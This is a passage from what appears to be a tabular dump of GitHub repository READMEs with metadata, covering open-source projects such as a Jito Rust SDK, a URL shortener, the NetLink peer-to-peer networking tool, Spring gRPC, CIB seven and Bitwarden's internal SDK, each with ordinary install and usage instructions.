Add the following to your `Cargo.toml`:

```toml
[dependencies]
jito-sdk-rust = ""0.1.0""  # Replace with the actual version
```

## Usage Examples

### Basic Transaction Example

To run the basic transaction example:

1. Ensure your environment is set up in `jito-rust-rpc/examples/basic_txn.rs`:

   ```rust
   // Load the sender's keypair
   let sender = load_keypair(""/path/to/wallet.json"")?;

   // Set up receiver pubkey
   let receiver = Pubkey::from_str(""YOUR_RECEIVER_PUBKEY"")?;
   ```

2. Run the example:
   ```bash
   cargo run --example basic_txn
   ```

### Basic Bundle Example

To run the basic bundle example:

1. Set up your environment in `jito-rust-rpc/examples/basic_bundle.rs`:

   ```rust
   // Load the sender's keypair
   let sender = load_keypair(""/path/to/wallet.json"")?;

   // Set up receiver pubkey
   let receiver = Pubkey::from_str(""YOUR_RECEIVER_PUBKEY"")?;
   ```

2. Run the example:
   ```bash
   cargo run --example basic_bundle
   ```

## Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

## Support

For support, please join our [Discord community](https://discord.gg/jTSmEzaR).
",0,1,7,,publish.yml,9.0
Hoverth/ssurlss,main,"# SSURLSS

##### super simple URL shortener service

![logo](./assets/favicon.png)

A very lightweight URL shortener.

## Usage

### Standalone

You can use ssurlss standalone by manually compiling & installing it
in a directory. Running it for the first time will generate the
`ssurlss.toml` config file, which can be edited, and the changes
will take affect once ssurlss is restarted.

### Docker

#### Using GitHub Packages

Use the supplied
[deploy.docker-compose.yml](https://github.com/Hoverth/ssurlss/blob/main/deploy.docker-compose.yml)
, or simply run

```sh
docker run -p 8000:8000 \
           -v ./ssurlss.toml:/ssurlss.toml \
              ghcr.io/hoverth/ssurlss:main
```

#### Build yourself

You can build the docker image using supplied `docker-compose.yml`
using `docker-compose up` in a clone of this repo.

To use a specific release, change the `build: .` to
`build: https://github.com/Hoverth/ssurlss.git#v1.1.0`
(just change the `v1.1.0` to whatever
[release](https://github.com/Hoverth/ssurlss/releases) you want to target).

## Configuration

There are several options to configure ssurlss, which can both be
controlled via changes in the config, or set via environment
variables (which override the config file configuration).

The following list is formatted as: `- toml_name (ENVNAME, default value) Notes`

- host (HOST, `""http://localhost:8000""`) This is only really needed
if allowing new entries
- url_path (URLPATH, `""""`) The path that the application should use,
e.g. `<host>/ssurlss/<subpaths>`
- link_path (LINKPATH, `""links""`) The subpath that links should use,
e.g. `<host>/link/<entry id>`
- port (PORT, `8000`) The port for the server to listen on, if using
in docker just set the mapped port in the `docker-compose.yml`
- allow_new (ALLOWNEW/DISALLOWNEW, `true`) Setting either envvar to
1 will set the relevant value in the config.
- entries_len (no envvar, `0`) A helpful tracking value for admin
purposes, no environment variable and not used anywhere (write-only).

## License

This project is licensed under the AGPL v3. See `LICENSE` for details.
",1,0,1,AGPL-3.0,"docker-release.yml,release.yml",0.0
thomastschurtschenthaler/electrico,main,"<p align=""center"">
	<img src=""./electrico.png"" width=""200em"" />
    <br>
	<span>A Lightweight Electron 'compatible' App Container</span><br>
	<small>Thomas Tschurtschenthaler</small>
</p>

## Overview

Electrico is an experimental alternative App Container for [Electron](https://www.electronjs.org/) Apps.

It is written in **Rust** and **Javascript** on top of the cross-platform WebView rendering library [Wry/Tauri](https://crates.io/crates/wry).

All Javascript code is executed within embedded system-native Web Views - one for the NodeJS 'backend', one for each Electron App-GUI browser window.
The Electron and Node APIs are emulated with corresponding Rust API calls. All communcation between the Web Views and Rust runs on synchronous and asynchronous XMLHttpRequests.

**Electrico comes lightweight - no need to bundle Node.js and Chromium binaries with the App executable!**

### Features
-   build size down to about 10MB
-   cross platform for linux, macos, windows, ios and android
-   debugging frontend and backend with native browser dev-tools

As for now some basic Electron and Node APIs are - partly - implemented:
-   common Electron App startup and BrowserWindow methods
-   Electron IPC and preload.js
-   parts of the Electron dialog API (OpenDialog, SaveDialog, MessageBox)
-   basic parts of NodeJS file system API (access, fstat, mkdir, readfile, writefile, watch)
-   parts of NodeJS process API (child_process spawn)

### Try out the Test App (Folder /Resources)
<img src=""./screenshots/testapp.png"" title=""Electrico Test App"" width=""1000em"" />

The Test App is configured to start up by default when Electrico is started from the project folder

	cargo run

When Electrico is started in debug mode, it opens a browser dev tools window for the 'node backend' where debugging takes place. Also all GUI windows are shown with dev tools.

To start Electrico without dev tools, run

	cargo run --release

## Test with App 'Codex'
As a more ambitious showcase I chose [Codex](https://codexnotes.com/) by Josh Vickery.

Clone [Codex Github](https://github.com/jcv8000/Codex) and give it a try.

From the Codex repository folder start Codex in DEV mode:

	pnpm dev

Codex starts up with Electron - you may close the Electron Window as we only need the DEV-Server running on port **5173**.
Then point the link in **ResourceLink.json** to the Codex repository folder and start up Electrico:

	cargo run

<img src=""./screenshots/codex_frontend_debug.png"" title=""Codex Frontend Debug"" width=""1000em"" />
<img src=""./screenshots/codex_backend_debug.png"" title=""Codex Backend Debug"" width=""1000em"" />
",0,5,1,,,0.0
laperlej/zellij-sessionizer,main,"# zellij-sessionizer

[showcase.webm](https://github.com/user-attachments/assets/dc1b3174-07ac-4210-a689-bdc2e16ee0de)

This plugin is based on ThePrimeagen's tmux sessionizer [script](https://github.com/ThePrimeagen/.dotfiles/blob/master/bin/.local/scripts/tmux-sessionizer)

The idea is to provide a list of directories that contain your projects/repos. When open, the plugin will display a list of all the subdirectories(1 deep) for selection.

When a directory is selected, a new session will be created with it's name and cwd set to the directory.

If the session already exists, it will attach instead.

The main difference with the built-in filepicker is that the search is done over a single combined flat list so there is no need to navigate the file system.

## Usage

- up/down arrow: select previous/next folder
- enter: create session based on selected folder
- other characters will populate a search bar that will apply fuzzy find.

## Installation

Download zellij-session-tree.wasm from the [latest release](https://github.com/laperlej/zellij-sessionizer/releases/latest) and place it in your zellij plugins folder.

```bash
mkdir -p ~/.config/zellij/plugins
wget https://github.com/laperlej/zellij-session-tree/releases/latest/download/zellij-session-tree.wasm -O ~/.config/zellij/plugins/zellij-session-tree.wasm
```

## Configuration

Add the plugin to a keybinding in your config.toml.

In this example, the keybinding is bound to `g` in tmux mode.

```kdl
tmux {
    # other keybinds here ...
    bind ""g"" { LaunchOrFocusPlugin ""file:~/.config/zellij/plugins/zellij-sessionizer.wasm"" {
            floating true
            move_to_focused_tab true
            cwd ""/""
            root_dirs ""/home/laperlej/projects;/home/laperlej/workspaces""
            session_layout ""myCustomLayout""
        }; SwitchToMode ""Locked"";
    }
}
```

arguments:

- root_dirs: string of paths separated by a semicolon, default is `""""`
- session_layout: the layout to use for new sessions, please prepend the layout name with a `:` if you want to use a built-in layout ex: `:compact`, default is `:default`. If there is a `layout.kdl` on the target folder it will be used instead.

**IMPORTANT:** I highly recommend setting cwd to `/`. due to the way plugins interact with the filesystem the root_dirs **must** be absolute paths and **must** be descendants of the cwd.

## Contributing

Contributions are welcome. Please open an issue or a pull request.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
",9,0,1,MIT,release.yml,5.0
baehyunsol/ragit,main,"# RAGIT

RAGIT (rag-it) is a git-like software that turns your local files into a knowledge-base. The main goal of this project is to make knowledge-bases easy-to-create and easy-to-share.

## Why another RAG framework?

RAGIT is very different from the other RAG frameworks.

1. It adds a title and summary to every chunks. The summaries make AIs very easy to rerank chunks.
2. It uses tfidf scores instead of vector searches. It first asks an AI to generate keywords from a query, then runs tfidf search with the keywords.
3. It supports markdown files with images.
4. It supports multi-turn queries (experimental).
5. You can clone/push knowledge-bases, like git.
  - `push` command is WIP.

## More documents

- [Build](./docs/build.md)
- [Chunks](./docs/chunks.md)
- [Configuration](./docs/config.md)
- [Contribution](./docs/contribution.md)
- [Evaluation](./docs/eval.md)
- [Prompt Engineering](./docs/prompt_engineering.md)
- [Quick Guide](./docs/quick_guide.md)
",0,2,1,MIT,,0.0
v01dlabs/dollcode,main,"# dollcode ‚ññ‚ñò‚ñå

This is a zero-allocation implementation of dollcode; a trinary encoding system using Unicode box-drawing characters (‚ññ, ‚ñò, and ‚ñå)

## Features ‚ú®

* ‚ö° Zero-allocation core with heapless implementation
* üî¢ Support for decimal, hexadecimal, and text encoding (ASCII printable characters)
* üîÑ Bidirectional conversion between text/numbers and dollcode
* ü¶Ä Pure Rust implementation with no unsafe code
* üîó WebAssembly bindings
* üìù Comprehensive documentation and test coverage

### Web üåê

Visit the [web interface](https://dollcode.v01dlabs.sh) to start converting! The interface supports all available modes for encoding and decoding.

## How it Works üéõÔ∏è

Each dollcode character represents a trinary digit (base-3):
* Characters map to values: ‚ññ=1, ‚ñò=2, ‚ñå=3
* Text encoding uses zero-width joiners as delimiters

### Memory Guarantees ü§ù

**Zero Allocation**:
* Number encoding/decoding uses fixed-size stack buffers
* Text processing operates on slices without allocation
* Internal operations use stack-only arithmetic
* String conversion and collection may allocate - use heapless types for fully stack-based operations

**Zero Copy**:
* Input data is processed in-place without copying
* Text operations work directly on input slices
* Output is generated directly into fixed-size buffers
* No intermediate copying or reallocation occurs

**Fixed Memory Usage**:
* Number encoding: MAX_DOLLCODE_SIZE chars (41 bytes fixed)
* Text segments: 6 chars per segment (fixed)
* Total output buffer: 1800 bytes (100 chars √ó 18 bytes)
* Each character produces 5 dollcode chars + 1 delimiter

### Input Limits & Validation ‚úÖ

**Text**:
* ASCII printable characters only (codes 32-126)
* Maximum length: 100 characters
* Each char produces 5 dollcode chars + 1 delimiter
* Fixed 18-byte UTF-8 output per input char

**Numbers**:
* Decimal: 0 to 18,446,744,073,709,551,615 (u64::MAX)
* Maximum decimal digits: 20
* Hex: 0x0 to 0xFFFFFFFFFFFFFFFF
* Maximum hex length: 18 chars (including 0x prefix)

**dollcode**:
* Maximum length: 41 chars for numbers (2^64 - 1)
* Text mode: up to 1800 bytes total
* Only valid characters: ‚ññ, ‚ñò, ‚ñå
* Zero-width joiners (\u{200D}) are used as a delimiter

**Error Handling**:
* Comprehensive validation for all inputs
* Buffer overflow protection
* Invalid character detection
* Position tracking for error reporting
* Clear error messages with context

## License üìÑ

This project is licensed under:

[![License: MPL 2.0](https://img.shields.io/badge/License-MPL%202.0-brightgreen.svg)](LICENSE)

## Credits üôè

[noe](https://noe.sh/dollcode/) for the original idea & implementation

‚ñò‚ñò‚ññ‚ñò‚Äç‚ñå‚ññ‚ñò‚ññ‚Äç‚ñå‚ññ‚ñå‚ññ‚Äç‚ñå‚ññ‚ñå‚ñò‚Äç‚ñå‚ññ‚ñò‚Äç‚ñå‚ññ‚ñò‚ñò‚Äç‚ññ‚ññ‚ññ‚ññ‚ññ‚Äç‚ñå‚ññ‚ñò‚Äç‚ñå‚ññ‚ñå‚ñò‚Äç‚ñå‚ñò‚ñå‚ññ‚Äç
",0,0,1,MPL-2.0,"rust.yml,wasm.yml",0.0
LilyFoote/django-rusty-templates,main,"# Django Rusty Templates

Django Rusty Templates is an experimental reimplementation of Django's templating language in Rust.

## Goals

* 100% compatibility of rendered output.
* Error reporting that is at least as useful as Django's errors.
* Improved performance over Django's pure Python implementation.

## Installation

Django Rusty Templates is not yet ready for full release, so it is not available on PyPI yet. Instead it can be installed from github or from a local clone:

```sh
$ pip install git+https://github.com/LilyFoote/django-rusty-templates.git
```

```sh

$ git clone git@github.com:LilyFoote/django-rusty-templates.git
$ pip install ./django-rusty-templates
```

You will need a rust compiler installed (https://rustup.rs/).

## Usage

Add an entry to your [`TEMPLATES` setting](https://docs.djangoproject.com/en/5.1/ref/settings/#std-setting-TEMPLATES) with `""BACKEND""` set to `""django_rusty_templates.RustyTemplates""`:

```python
TEMPLATES = [
    {
        ""BACKEND"": ""django_rusty_templates.RustyTemplates"",
        ... # Other configuration options
    },
]
```

## Contributing

Django Rusty Templates is open to contributions. These can come in many forms:

* Implementing missing features, such as filters and tags built into Django.
* Reporting bugs where Django Rusty Templates gives the wrong result.
* Adding new test cases to ensure Django Rusty Templates behaves the same as Django.
* Adding benchmarks to track performance.
* Refactoring for readability or performance.
",0,18,1,BSD-3-Clause,"build.yml,python.yml,rust.yml",11.0
rustp2p/NetLink,main,"<p align=""center"">
  <a href=""./README.zh-CN.md"">ÁÆÄ‰Ωì‰∏≠Êñá</a> |
  <a href=""./README.md"">English</a>
</p>

NetLink is a decentralized networking tool built on the [rustp2p](https://crates.io/crates/rustp2p) library.

```
Usage: ./netLink.exe 
Usage: ./netLink.exe --api_addr 192.168.0.1:8080
Usage: netLink.exe [OPTIONS] --local <LOCAL IP> --group-code <GROUP CODE>

Options:
  -p, --peer <PEER>              Peer node address. e.g.: -p tcp://192.168.10.13:23333 -p udp://192.168.10.23:23333
  -l, --local <LOCAL IP>         Local node IP and prefix.If there is no 'prefix', Will not enable Tun. e.g.: -l 10.26.0.2/24
  -g, --group-code <GROUP CODE>  Nodes with the same group_code can form a network (Maximum length 16)
  -P, --port <PORT>              Listen local port [default: 23333]
  -b, --bind-dev <DEVICE NAME>   Bind the outgoing network interface (using the interface name). e.g.: -b eth0
      --threads <THREADS>        Set the number of threads [default: 2]
  -e, --encrypt <PASSWORD>       Enable data encryption. e.g.: -e ""password""
  -a, --algorithm <ALGORITHM>    Set encryption algorithm. Optional aes-gcm/chacha20-poly1305/xor [default: chacha20-poly1305]
      --exit-node <EXIT_NODE>    Global exit node,please use it together with '--bind-dev'
      --tun-name <TUN_NAME>      Set tun name
  -f, --config <CONFIG>          Start using configuration file
      --api-addr <API_ADDR>      Set backend http server address [default: 127.0.0.1:23336]
      --api-disable              Disable backend http server
  -h, --help                     Print help information
  -V, --version                  Print version information

 ```

## Start with config file

<details> <summary>open</summary>

```yaml
## ./netLink --config <config_file_path>
## On demand use, unnecessary configurations can be deleted

## Api server host. default is ""127.0.0.1:23336""
#api_addr: ""127.0.0.1:23336""
## Disable api. api_disable:true
#api_disable: false
## Number of program task threads. default is 2
#threads: 2
## group code. cannot be empty
group_code: String
## node tun ipv4. cannot be empty
node_ipv4: ""10.26.1.2""
## node tun network prefix. default is 24.If prefix=0, do not listen to the Tun network, and can only act as a relay node at this time
#prefix: 24
## node tun ipv6. The program will automatically generate node_ipv6
# node_ipv6: 
# prefix_v6: 96

## tun device name. The program will automatically generate tun_name
#tun_name: ""tun3""
## Enable data encryption
#encrypt: ""password""
## Set encryption algorithm. Optional aes-gcm/chacha20-poly1305/xor. default is chacha20-poly1305
#algorithm: ""chacha20-poly1305""
##   Listen local port. default is 23333
# port: 23333
## Peer node address
#peer:
#   - udp://192.168.10.23:23333
#   - tcp://192.168.10.23:23333
## Bind the outgoing network interface (using the interface name)
#bind_dev_name: ""eth0""
## Global exit node,please use it together with ""bind_dev_name""
#exit_node: 

## stun server addr
#udp_stun:
#   - stun1.l.google.com:19302
#   - stun2.l.google.com:19302
#tcp_stun:
#   - stun.flashdance.cx
#   - stun.nextcloud.com:443

```

</details>

## Web UI

[netlink-app](https://github.com/rustp2p/netlink-app)

### Usage Instructions:

#### 1. Launch using a Browser:

1. Start netlink.
2. Access http://127.0.0.1:23336 using a browser.

#### 2. Launch using Tauri Executable:

1. Start netlink.
2. Open the netlink-app.

## Features

| Features                |   |
|-------------------------|---| 
| **Decentralized**       | ‚úÖ |
| **Cross-platform**      | ‚úÖ |
| **NAT traversal**       | ‚úÖ | 
| **Subnet route**        | ‚úÖ | 
| **Encryption**          | ‚úÖ | 
| **Efficient**           | ‚úÖ | 
| **HTTP/Rust/C/JNI API** | ‚úÖ | 
| **IPv6/IPv4**           | ‚úÖ | 
| **UDP/TCP**             | ‚úÖ | 

## Quick Start

```mermaid
flowchart LR
    subgraph Node-A 8.210.54.141
        node_a[10.26.1.2/24]
    end
    subgraph Node-B
        node_b[10.26.1.3/24]
    end

    subgraph Node-C
        node_c[10.26.1.4/24]
    end

    node_a <-----> node_b
    node_c <-----> node_b
    node_a <-----> node_c
```

1. Node-A
    ```
    ./netLink --group-code 123 --local 10.26.1.2/24
    ```
2. Node-B
    ```
    ./netLink --group-code 123 --local 10.26.1.3/24 --peer 8.210.54.141:23333
    ```
3. Node-C
    ```
    ./netLink --group-code 123 --local 10.26.1.4/24 --peer 8.210.54.141:23333
    ```
4. Nodes A, B, and C can access each other

## Multi Node

```mermaid
flowchart LR
    subgraph Node-A 8.210.54.141
        node_a[10.26.1.2/24]
    end
    subgraph Node-B
        node_b[10.26.1.3/24]
    end

    subgraph Node-C 192.168.1.2
        node_c[10.26.1.4/24]
    end
    subgraph Node-D
        node_d[10.26.1.5/24]
    end
    node_b -----> node_a
    node_c -----> node_a
    node_d -----> node_c
```

```
Node-A: ./netLink --group-code 123 --local 10.26.1.2/24
Node-B: ./netLink --group-code 123 --local 10.26.1.3/24 --peer 8.210.54.141:23333
Node-C: ./netLink --group-code 123 --local 10.26.1.4/24 --peer 8.210.54.141:23333
Node-D: ./netLink --group-code 123 --local 10.26.1.5/24 --peer 192.168.1.2:23333
```

All connected nodes can access each other.

Furthermore, multiple nodes can be connected using '-peer'.  
exampleÔºö

```
Node-A: ./netLink --group-code 123 --local 10.26.1.2/24
Node-B: ./netLink --group-code 123 --local 10.26.1.3/24 --peer 8.210.54.141:23333
Node-C: ./netLink --group-code 123 --local 10.26.1.4/24 --peer 8.210.54.141:23333
Node-D: ./netLink --group-code 123 --local 10.26.1.5/24 --peer 192.168.1.2:23333 --peer 8.210.54.141:23333
```

## Subnet route

```
Public Node-S: 8.210.54.141

Subnet 1: 192.168.10.0/24
      Node-A: 192.168.10.2
      Node-B: 192.168.10.3
      
Other subnet:   
      Node-C

Node-S: ./netLink --group-code xxxx --local 10.26.1.1
Node-A: ./netLink --group-code 123 --local 10.26.1.3/24 --peer 8.210.54.141:23333
Node-C: ./netLink --group-code 123 --local 10.26.1.4/24 --peer 8.210.54.141:23333

Node-C <--> Node-A(192.168.10.2) <--> Node-B(192.168.10.3)
```

1. **Step 1 : Node-A Configure network card forwarding**

> forward the traffic whose source is within 10.26.1.0/24 to the specified network interface

**Linux**

   ```
   sudo sysctl -w net.ipv4.ip_forward=1
   sudo iptables -t nat -A POSTROUTING  -o eth0 -s 10.26.1.0/24 -j MASQUERADE
   ```

**Windows**

   ```
   New-NetNat -Name testSubnet -InternalIPInterfaceAddressPrefix 10.26.1.0/24
   ```

**Macos**

   ```
   sudo sysctl -w net.ipv4.ip_forward=1
   echo ""nat on en0 from 10.26.1.0/24 to any -> (en0)"" | sudo tee -a /etc/pf.conf
   sudo pfctl -f /etc/pf.conf -e
   ```

2. **Step 2 : Node-C Configure route**

> route all traffic whose destination is within 192.168.10.0/24 to 10.26.1.3(i.e. the node_id of Node-A)

**Linux**

   ```
   sudo ip route add 192.168.10.0/24 via 10.26.1.3 dev <netLink_tun_name>
   ```

**Windows**

   ```
   route add 192.168.10.0 mask 255.255.255.0 10.26.1.3 if <netLink_tun_index>
   ```

**Macos**

   ```
   sudo route -n add 192.168.10.0/24 10.26.1.3 -interface <netLink_tun_name>
   ```

At this point, Node-C can access the IP address of Node-B(192.168.10.3) via Node-A as if Node-C was directly connected
to Node-B.

## Link library

https://github.com/rustp2p/NetLink_adapter

## Contact

- TG: https://t.me/+hdMW5gWNNBphZDI1
- QQ group: 211072783

## Free community nodes

- --peer tcp://198.46.149.74:23333
",21,2,5,Apache-2.0,rust.yml,5.0
Kaisia-Estrel/activate-linux,master,"# Activate-Linux

A stupid little joke program for Linux

![Fullscreen view, showing Activate-Linux on the corner](./resources/sample.png)
![Closeup view of Activate-Linux](./resources/closeup.png)

## Running

Ensure libxkbcommon and pkg-config are installed, then simply `cargo run`.

The repo can also be ran as a flake:
```
nix run github:Kaisia-Estrel/activate-linux
```

specify `--header` and `--caption` to change the text of the overlay, however this doesnt
check the actual length of the text so it may draw over itself if it's too long.

```
activate-linux --header ""Activate Nixos"" --caption ""1 2 3 4 5 6 7 8 9 10 q w e r t y u i o p a s d f g h j k l z x c v""
```
![Overflowing text](./resources/overflow.png)
",0,0,1,,,0.0
ryanccn/morlana,main,"# morlana

[nix-darwin](https://github.com/LnL7/nix-darwin) utilities, implemented in Rust

```sh
nix run github:ryanccn/morlana
```

## Features

- Support for better build logs with [nix-output-monitor](https://github.com/maralorn/nix-output-monitor)
- Support for diffing with [nvd](https://gitlab.com/khumba/nvd) before switching configurations
- Confirmation prompts for important actions
- Flakes-first (_does not work with channels setups at the moment_)
- Improved uninstaller logic
  - Addresses https://github.com/NixOS/nix/issues/3261
  - Restores `.before-nix-darwin` files automagically
- Works as a standalone binary
- More aesthetic logging

## Getting started

morlana is capable of initializing a nix-darwin system using flakes by itself. In order to get started, run

```sh
nix run github:ryanccn/morlana -- init
```

Alternatively, if you have an existing nix-darwin configuration you want to switch to:

```sh
nix run github:ryanccn/morlana -- switch --flake ""<path_to_flake>""
```

To remove nix-darwin from your system:

```sh
nix run github:ryanccn/morlana -- uninstall
```

For more detailed information on available commands and options, run `morlana --help`.

## License

GPLv3
",0,0,1,GPL-3.0,"build.yml,check.yml,release.yml",0.0
spring-projects-experimental/spring-grpc,main,"# Spring gRPC
![""Build Status""](https://github.com/spring-projects-experimental/spring-grpc/actions/workflows/deploy.yml/badge.svg)

Welcome to the Spring gRPC project!

The Spring gRPC project provides a Spring-friendly API and abstractions for developing gRPC applications. There is a core library that makes it easy to work with gRPC and dependency injection, and a Spring Boot starter that makes it easy to get started with gRPC in a Spring Boot application (with autoconfiguration and configuration properties, for instance).

For further information go to our [Spring gRPC reference documentation](https://docs.spring.io/spring-grpc/reference/).

# Getting Started

This section offers jumping off points for how to get started using Spring gRPC. There is a simple sample project in the `samples` directory (e.g. [`grpc-server`](https://github.com/spring-projects-experimental/spring-grpc/tree/main/samples/grpc-server)). You can run it with `mvn spring-boot:run` or `gradle bootRun`. You will see the following code in that sample.

You should follow the steps in each of the following section according to your needs.

**üìå NOTE**\
Spring gRPC supports Spring Boot 3.3.x

## Add Milestone and Snapshot Repositories

If you prefer to add the dependency snippets by hand, follow the directions in the following sections.

To use the Milestone and Snapshot version, you need to add references to the Spring Milestone and/or Snapshot repositories in your build file.

For Maven, add the following repository definitions as needed (if you are using snapshots or milestones):

```xml
  <repositories>
    <repository>
      <id>spring-milestones</id>
      <name>Spring Milestones</name>
      <url>https://repo.spring.io/milestone</url>
      <snapshots>
        <enabled>false</enabled>
      </snapshots>
    </repository>
    <repository>
      <id>spring-snapshots</id>
      <name>Spring Snapshots</name>
      <url>https://repo.spring.io/snapshot</url>
      <releases>
        <enabled>false</enabled>
      </releases>
    </repository>
  </repositories>
```

For Gradle, add the following repository definitions as needed:

```groovy
repositories {
  mavenCentral()
  maven { url 'https://repo.spring.io/milestone' }
  maven { url 'https://repo.spring.io/snapshot' }
}
```

## Dependency Management

The Spring gRPC Dependencies declares the recommended versions of all the dependencies used by a given release of Spring gRPC.
Using the dependencies from your application‚Äôs build script avoids the need for you to specify and maintain the dependency versions yourself.
Instead, the version you‚Äôre using determines the utilized dependency versions.
It also ensures that you‚Äôre using supported and tested versions of the dependencies by default, unless you choose to override them.

If you‚Äôre a Maven user, you can use the dependencies by adding the following to your pom.xml file -

```xml
<dependencyManagement>
    <dependencies>
        <dependency>
            <groupId>org.springframework.grpc</groupId>
            <artifactId>spring-grpc-dependencies</artifactId>
            <version>0.2.0-SNAPSHOT</version>
            <type>pom</type>
            <scope>import</scope>
        </dependency>
    </dependencies>
</dependencyManagement>
```

Gradle users can also use the Spring gRPC Dependencies by leveraging Gradle (5.0+) native support for declaring dependency constraints using a Maven BOM.
This is implemented by adding a 'platform' dependency handler method to the dependencies section of your Gradle build script.
As shown in the snippet below this can then be followed by version-less declarations of the Starter Dependencies for the one or more spring-grpc modules you wish to use, e.g. spring-grpc-openai.

```gradle
dependencies {
  implementation platform(""org.springframework.grpc:spring-grpc-dependencies:0.2.0-SNAPSHOT"")
}
```

You need a Protobuf file that defines your service and messages, and you will need to configure your build tools to compile it into Java sources. This is a standard part of gRPC development (i.e. nothing to do with Spring). We now come to the Spring gRPC features.

## gPRC Server

Create a `@Bean` of type `BindableService`. For example:

```java
@Service
public class GrpcServerService extends SimpleGrpc.SimpleImplBase {
...
}
```

(`BindableService` is the interface that gRPC uses to bind services to the server and `SimpleImplBase` was created for you from your Protobuf file.)

Then, you can just run your application and the gRPC server will be started on the default port (9090). Here‚Äôs a simple example (standard Spring Boot application):

```java
@SpringBootApplication
public class GrpcServerApplication {
	public static void main(String[] args) {
		SpringApplication.run(GrpcServerApplication.class, args);
	}
}
```

Run it from your IDE, or on the command line with `mvn spring-boot:run` or `gradle bootRun`.

## gRPC Client

To create a simple gRPC client, you can use the Spring Boot starter (see above - it‚Äôs the same as for the server). Then you can inject a bean of type `GrpcChannelFactory` and use it to create a gRPC channel. The most common usage of a channel is to create a client that binds to a service, such as the one above. The Protobuf-generated sources in your project will contain the stub classes, and they just need to be bound to a channel. For example, to bind to the `SimpleGrpc` service on a local server:

```java
@Bean
SimpleGrpc.SimpleBlockingStub stub(GrpcChannelFactory channels) {
	return SimpleGrpc.newBlockingStub(channels.createChannel(""0.0.0.0:9090"").build());
}
```

Then you can inject the stub and use it in your application.

The default `GrpcChannelFactory` implementation can also create a ""named"" channel, which you can then use to extract the configuration to connect to the server. For example:

```java
@Bean
SimpleGrpc.SimpleBlockingStub stub(GrpcChannelFactory channels) {
	return SimpleGrpc.newBlockingStub(channels.createChannel(""local"").build());
}
```

then in `application.properties`:

```properties
spring.grpc.client.channels.local.address=0.0.0.0:9090
```

There is a default named channel (named ""default"") that you can configure in the same way, and then it will be used by default if there is no channel with the name specified in the channel creation.
",0,8,2,,"ci-pr.yml,deploy.yml,docs.yml",40.0
cibseven/cibseven,main,"# CIB seven - The open source BPMN platform

[![cibseven manual latest](https://img.shields.io/badge/manual-latest-brown.svg)](https://docs.cibseven.de/manual/latest/) [![License](https://img.shields.io/github/license/cibseven/cibseven?color=blue&logo=apache)](https://github.com/camunda/camunda-bpm-platform/blob/master/LICENSE) [![Discussions](https://img.shields.io/badge/discussions-cibseven-green)](https://github.com/orgs/cibseven/discussions)

CIB seven is a flexible framework for workflow and process automation. Its core is a native BPMN 2.0 process engine that runs inside the Java Virtual Machine. It can be embedded inside any Java application and any Runtime Container. It integrates with Java EE 6 and is a perfect match for the Spring Framework. On top of the process engine, you can choose from a stack of tools for human workflow management, operations and monitoring.

- Web Site: https://cibseven.de
- Getting Started: https://docs.cibseven.de/get-started/
- Discussions: https://github.com/orgs/cibseven/discussions
- Issue Tracker: https://github.com/cibseven/cibseven/issues

## Components

CIB seven provides a rich set of components centered around the BPM lifecycle.

#### Process Implementation and Execution

- Engine - The core component responsible for executing BPMN 2.0 processes.
- REST API - The REST API provides remote access to running processes.
- Spring, CDI Integration - Programming model integration that allows developers to write Java Applications that interact with running processes.

#### Process Design

- Camunda Modeler - A [standalone desktop application](https://github.com/camunda/camunda-modeler) that allows business users and developers to design & configure processes.

#### Process Operations

- Engine - JMX and advanced Runtime Container Integration for process engine monitoring.
- Cockpit - Web application tool for process operations.
- Admin - Web application for managing users, groups, and their access permissions.

#### Human Task Management

- Tasklist - Web application for managing and completing user tasks in the context of processes.

#### And there's more...

- [bpmn.io](https://bpmn.io/) - Toolkits for BPMN, CMMN, and DMN in JavaScript (rendering, modeling)
- [Community Extensions](https://docs.cibseven.de/manual/latest/introduction/extensions/) - Extensions on top of CIB seven provided and maintained by our great open source community

## A Framework

In contrast to other vendor BPM platforms, CIB seven strives to be highly integrable and embeddable. We seek to deliver a great experience to developers that want to use BPM technology in their projects.

### Highly Integrable

Out of the box, CIB seven provides infrastructure-level integration with Java EE Application Servers and Servlet Containers.

### Embeddable

Most of the components that make up the platform can even be completely embedded inside an application. For instance, you can add the process engine and the REST API as a library to your application and assemble your custom BPM platform configuration.

## Contributing

Please see our [contribution guidelines](CONTRIBUTING.md) for how to raise issues and how to contribute code to our project.

## Tests

To run the tests in this repository, please see our [testing tips and tricks](TESTING.md).


## License

The source files in this repository are made available under the [Apache License Version 2.0](./LICENSE).

CIB seven uses and includes third-party dependencies published under various licenses. By downloading and using CIB seven artifacts, you agree to their terms and conditions. Refer to https://docs.cibseven.de/manual/latest/introduction/third-party-libraries/ for an overview of third-party libraries and particularly important third-party licenses we want to make you aware of.
",0,0,137,Apache-2.0,"add-issue-to-project.yml,backport.yml,close-stale-issues.yml,copy-issue.yml,extract-issue-links.yml,java-dependency-check.yml,java-dependency-tree.yml,maven.yml,sync-label-colors.yml",13.0
bitwarden/sdk-internal,main,"# Bitwarden Internal SDK

This repository houses the internal Bitwarden SDKs. We also provide a public
[Secrets Manager SDK](https://github.com/bitwarden/sdk-sm).

### Disclaimer

The password manager SDK is not intended for public use and is not supported by Bitwarden at this
stage. It is solely intended to centralize the business logic and to provide a single source of
truth for the internal applications. As the SDK evolves into a more stable and feature complete
state we will re-evaluate the possibility of publishing stable bindings for the public. **The
password manager interface is unstable and will change without warning.**

# We're Hiring!

Interested in contributing in a big way? Consider joining our team! We're hiring for many positions.
Please take a look at our [Careers page](https://bitwarden.com/careers/) to see what opportunities
are currently open as well as what it's like to work at Bitwarden.

## Getting Started

### Linux / Mac / Windows

```bash
cargo build
```

### Windows on ARM

To build, you will need the following in your PATH:

- [Python](https://www.python.org)
- [Clang](https://clang.llvm.org)
  - We recommend installing this via the
    [Visual Studio Build Tools](https://visualstudio.microsoft.com/downloads/#build-tools-for-visual-studio-2022)

## Documentation

Please refer to our [Contributing Docs](https://contributing.bitwarden.com/) for
[getting started](https://contributing.bitwarden.com/getting-started/sdk/) instructions and
[architectural documentation](https://contributing.bitwarden.com/architecture/sdk/).

You can also browse the latest published documentation:

- [docs.rs](https://docs.rs/bitwarden/latest/bitwarden/) for the public SDK.
- Or for developers of the SDK, view the internal
  [API documentation](https://sdk-api-docs.bitwarden.com/bitwarden_core/index.html) which includes
  private items.

## Crates

The project is structured as a monorepo using cargo workspaces. Some of the more noteworthy crates
are:

- [`bitwarden-api-api`](./crates/bitwarden-api-api/): Auto-generated API bindings for the API
  server.
